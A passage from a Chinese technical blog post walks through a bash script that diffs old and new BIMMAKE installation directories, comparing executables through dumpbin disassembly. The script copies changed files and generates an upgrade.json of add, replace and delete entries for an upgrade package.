Files C:/compare/BIMMAKE.old/sdk/zlib1.dll and C:/compare/BIMMAKE/sdk/zlib1.dll differ
Only in C:/compare/BIMMAKE: sky_image
Only in C:/compare/BIMMAKE: zh-CN
Only in C:/compare/BIMMAKE: zh-TW
&lt;/pre&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;文件内容对比&lt;/h2&gt;
&lt;p&gt;在上面目录对比过程中，如果两边文件都存在而只是内容不同，进入文件内容对比逻辑：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; # &lt;span&gt;for&lt;/span&gt; windows command, parameter seperator is /
&lt;span&gt; 2&lt;/span&gt; # and bash will autoexpand to DRIVE:/
&lt;span&gt; 3&lt;/span&gt; # here use &lt;span&gt;//&lt;/span&gt;&lt;span&gt; to avoid expanding.&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; $win32/dumpbin &lt;span&gt;//&lt;/span&gt;&lt;span&gt;disasm &quot;$left&quot; | sed '5d' &amp;gt; &quot;$srcasm&quot;&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; # use &lt;span&gt;sed&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;5d&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt; to remove a line like :
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; # Dump of &lt;span&gt;file&lt;/span&gt;&lt;span&gt; Bin1334\Release\GSUPService.exe
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; # &lt;span&gt;which&lt;/span&gt; disturb the &lt;span&gt;diff&lt;/span&gt; result by writing &lt;span&gt;dir&lt;/span&gt;&lt;span&gt; name 
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; # remove it !!
&lt;span&gt;10&lt;/span&gt; $win32/dumpbin &lt;span&gt;//&lt;/span&gt;&lt;span&gt;disasm &quot;$right&quot; | sed '5d' &amp;gt; &quot;$dstasm&quot;&lt;/span&gt;
&lt;span&gt;11&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ $(&lt;span&gt;cat&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcasm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; | &lt;span&gt;wc&lt;/span&gt; -l) -gt &lt;span&gt;10&lt;/span&gt; ] &amp;amp;&amp;amp; [ $(&lt;span&gt;cat&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstasm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; | &lt;span&gt;wc&lt;/span&gt; -l) -gt &lt;span&gt;10 &lt;/span&gt;]; &lt;span&gt;then&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt;     # left &amp;amp;&lt;span&gt; right are all valid PE format 
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;     resp=$(&lt;span&gt;diff&lt;/span&gt; -q &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcasm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstasm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ $verbose != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;resp=$resp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;17&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;18&lt;/span&gt; &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;19&lt;/span&gt;     resp=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;non PE format differs&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;20&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$resp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;22&lt;/span&gt; 
&lt;span&gt;23&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$resp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;24&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;   $left \n== $right in asm, skip&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt; &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;26&lt;/span&gt; &lt;span&gt;    # need to replace
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;   $left \n!= $right&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;28&lt;/span&gt;     relpath=$(get_relative_path &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$left&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;30&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;find relative path by source dir failed, try dest&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;31&lt;/span&gt;         relpath=$(get_relative_path  &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$right&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; [ -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt;
&lt;span&gt;33&lt;/span&gt;             &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;find relative path by dest dir failed, skip&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;34&lt;/span&gt; &lt;span&gt;            continue;
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt;         &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;36&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;37&lt;/span&gt; 
&lt;span&gt;38&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ $verbose != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;39&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;relpath: $relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;40&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;41&lt;/span&gt; 
&lt;span&gt;42&lt;/span&gt;     tarpath=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$outdir/$setupdir$relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;43&lt;/span&gt;     copy_file &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$right&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$tarpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;44&lt;/span&gt;     itemcnt=$(($itemcnt+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ $exactmode != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;46&lt;/span&gt;         # 1st argument represent &lt;span&gt;zip&lt;/span&gt;&lt;span&gt; folder
&lt;/span&gt;&lt;span&gt;47&lt;/span&gt;         # 2nd argument represent &lt;span&gt;install&lt;/span&gt;&lt;span&gt; folder
&lt;/span&gt;&lt;span&gt;48&lt;/span&gt;         # differs with copy order !
&lt;span&gt;49&lt;/span&gt;         replace_item &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$setupdir$relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;50&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;51&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;这里需要考虑二进制可执行文件不能直接对比（同样的代码编译两次得到的可执行文件也不一样，这是因为 PE 文件中包含了生成时间、唯一 ID 等与代码无关的内容），因此需要将其先反编译为汇编文本，再对汇编语句进行对比。这里没有通过文件后缀(dll / exe)来判断是否为可执行文件，这是因为产品中总有一些 dll 有奇奇怪怪的后缀。这里统一采用 dumpbin 进行反汇编，如果成功就是可执行文件；反之就是普通的文本或二进制文件。&lt;/p&gt;
&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;-0.5&quot;&gt;1-10：尝试使用 dumpbin 进行反汇编（注意使用 //disasm 来传递 win32 命令选项，因为 msys2 会将单独的 / 认为是根目录从而自动进行扩展、是我们不想要的）。下面是反汇编成功后的输出：&lt;br/&gt;&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
Microsoft (R) COFF/PE Dumper Version 12.00.40629.0
Copyright (C) Microsoft Corporation.  All rights reserved.



File Type: DLL

  0000000180001000: 45 8B C0           mov         r8d,r8d
  ……
  000000018000E202: CC                 int         3

  Summary

        1000 .data
        1000 .pdata
        7000 .rdata
        1000 .reloc
        1000 .rsrc
        E000 .text
&lt;/pre&gt;&lt;/div&gt;
可见 dumpbin 会输出一个占 5 行的头部信息，为了防止这个信息干扰后续的对比，这里使用 sed 删除前 5 行；&lt;/li&gt;
&lt;li readability=&quot;2.5&quot;&gt;12-21：如果旧文件与新文件反汇编结果行数都大于10，说明两者都是可执行文件，去除前 5 行后进行反汇编内容的对比；否则是普通文件，不再进行对比（diff 已告诉我们它们不同）。下面是反汇编失败时的输出：
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
$ win32/dumpbin //disasm  C:/compare/BIMMAKE/FillPatternFileApiTestData/right.pat
Microsoft (R) COFF/PE Dumper Version 12.00.40629.0
Copyright (C) Microsoft Corporation.  All rights reserved.


Dump of file C:/compare/BIMMAKE/FillPatternFileApiTestData/right.pat
C:/compare/BIMMAKE/FillPatternFileApiTestData/right.pat : warning LNK4048: Invalid format file; ignored

  Summary
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以看到一共只有 9 行输出，而一般成功的反汇编输出少则上百行、多则上万行，再少也不可能少于 10 行输出；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;23-36：如果文件内容一样，跳过此文件；否则需要确定当前文件在对比目录中的相对路径。先尝试使用旧目录去获取，如果失败再尝试使用新目录去获取。这里获取相对目录的工作交由 get_relative_path 这个函数来完成，出于对整体的把握，这里不对这些细节展开介绍了；&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;42-50：通过上面获得的相对路径，就可以在输出目录构建目标文件全路径啦。复制文件的工作交由 copy_file 函数来完成，在内部它先创建对应的目录，然后调用 cp 完成文件复制。如果用户选择了 exact 模式，则将为每项在配置文件中添加一条 json 格式的替换记录 (通过 replace_item 函数)，格式类似于下面这样：
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
{
  &quot;type&quot;: &quot;replace&quot;,
  &quot;target&quot;: &quot;/Teigha/ACCAMERA_20.8src_14.tx&quot;,
  &quot;source&quot;: &quot;setup/Teigha/ACCAMERA_20.8src_14.tx&quot;
},
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 对于非 exact 模式可以直接将整个目录递归覆盖到目标区域，因而不需要一条条的添加 json 配置。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;单个文件处理&lt;/h2&gt;
&lt;p&gt;在上面的目录对比过程中，如果两边只有一个文件/目录存在，进入单个文件/目录处理逻辑：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; relpath=$(get_relative_path &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ ! -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;    # need to remove 
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;only in  $srcdir: (old)\n         $dir/$file, \nrelpath: $relpath/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt;     itemcnt=$(($itemcnt+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     # 1st argument represent &lt;span&gt;install&lt;/span&gt;&lt;span&gt; folder
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     # differs with copy order !
&lt;span&gt; 8&lt;/span&gt;     delete_item &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$relpath/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; $isdir
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;     relpath=$(get_relative_path &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstdir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ ! -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$relpath&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt; &lt;span&gt;        # need to add
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;only in  $dstdir: (new)\n         $dir/$file, \nrelpath: $relpath/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt;         copy_file &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dir/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$outdir/$setupdir$relpath/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;15&lt;/span&gt;         itemcnt=$(($itemcnt+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; [ $exactmode != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt;             # 1st argument represent &lt;span&gt;zip&lt;/span&gt;&lt;span&gt; folder
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;             # 2nd argument represent &lt;span&gt;install&lt;/span&gt;&lt;span&gt; folder
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;             # differs with copy order !
&lt;span&gt;20&lt;/span&gt;             add_item &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$setupdir$relpath/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$relpath/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; $isdir
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;         &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;22&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;23&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;unknown single file: $dir/$file&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;24&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果单个文件项位于新目录，则新增文件项；如果位于旧目录，则删除：&lt;/p&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;6.5&quot;&gt;1-8：计算单个文件项在旧目录的相对路径，如果结果不为空，表示文件项位于旧目录，否则位于新目录。删除文件的工作交由 delete_item 函数完成，其实就是在配置文件中加入一条删除记录：
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
{
  &quot;type&quot;: &quot;delete&quot;,
  &quot;target&quot;: &quot;/sdk/QProfile.txt&quot;
},
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 如果是单独的目录，则递归删除整个目录：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
{
  &quot;type&quot;: &quot;delete_dir&quot;,
  &quot;target&quot;: &quot;/Share/ViewCoreResources/MaterialLibrary/textures/rainTextures&quot;
},
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 删除项是否添加是和 exact 模式无关的，因为目录的递归覆盖只能添加或替换文件，不能删除。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;生成配置文件&lt;/h2&gt;
&lt;p&gt;处理完各个文件和子目录以后，就可以生成升级需要的配置文件啦：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;# remove temporary files
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ $verbose -eq &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;    # only remove temporary files 
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     # when not &lt;span&gt;in&lt;/span&gt;&lt;span&gt; verbose mode
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;rm&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$srcasm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;rm&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dstasm&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;rm&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$dirdiff&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ $itemcnt -eq &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;no item add/replace/delete found, stop generating...&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt;     exit &lt;span&gt;1&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;14&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; [ $exactmode -eq &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    # not exact mode
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;     # add setup &lt;span&gt;dir&lt;/span&gt;&lt;span&gt; totally
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$reldir&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;19&lt;/span&gt;         jsonitem=$(&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;     {\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;      \&quot;type\&quot;: \&quot;add_dir\&quot;,\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;      \&quot;target\&quot;: \&quot;.\&quot;,\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;      \&quot;source\&quot;: \&quot;$setupdir\&quot;\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;    }&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;
&lt;span&gt;25&lt;/span&gt;         jsonitem=$(&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;     {\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;      \&quot;type\&quot;: \&quot;add_dir\&quot;,\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;      \&quot;target\&quot;: \&quot;$reldir\&quot;,\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;      \&quot;source\&quot;: \&quot;$setupdir\&quot;\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;         &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;    }&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;31&lt;/span&gt; 
&lt;span&gt;32&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ $verbose != &lt;span&gt;0&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;33&lt;/span&gt;         &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$jsonitem&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;34&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;35&lt;/span&gt; 
&lt;span&gt;36&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; [ -z &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; ]; &lt;span&gt;then&lt;/span&gt; 
&lt;span&gt;37&lt;/span&gt;         json=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$jsonitem&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;38&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt; 
&lt;span&gt;39&lt;/span&gt;         json=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$json,\n$jsonitem&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;40&lt;/span&gt;     &lt;span&gt;fi&lt;/span&gt;
&lt;span&gt;41&lt;/span&gt; &lt;span&gt;fi&lt;/span&gt; 
&lt;span&gt;42&lt;/span&gt; 
&lt;span&gt;43&lt;/span&gt; json=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$jsonhead$json$jsontail&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;44&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; &amp;gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$outdir/upgrade.json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;45&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;upgrade.json created, $itemcnt items generated&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;46&lt;/span&gt; &lt;span&gt;echo&lt;/span&gt; -e &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$json&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;由于之前在处理文件过程中已经将必要的配置信息生成好了，这里的工作其实很简单：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;2-8：如果指定 verbose 选项，则保留中间文件用于排错，否则删除；&lt;/li&gt;
&lt;li&gt;10-13：如果经过对比，没有任何差异，或两个目录都是空的，导致输出内容为空，则中止并退出整个打包脚本；&lt;/li&gt;
&lt;li&gt;15-41：非 exact 模式下，需要添加一条 add_dir 配置来将输出目录中的所有文件递归覆盖到安装目录。如果用户指定了只替换安装目录中的某个子目录，这里需要调整一下目标路径(line 24-30)；&lt;/li&gt;
&lt;li&gt;43-46：将各个 json 组装成完整内容并生成到输出目录，名称固定为 &quot;upgrade.json&quot;。&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;生成压缩包&lt;/h2&gt;
&lt;p&gt;所有内容就绪后就可以压缩成包上传到后台啦：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; tarpath=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;$outdir/*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
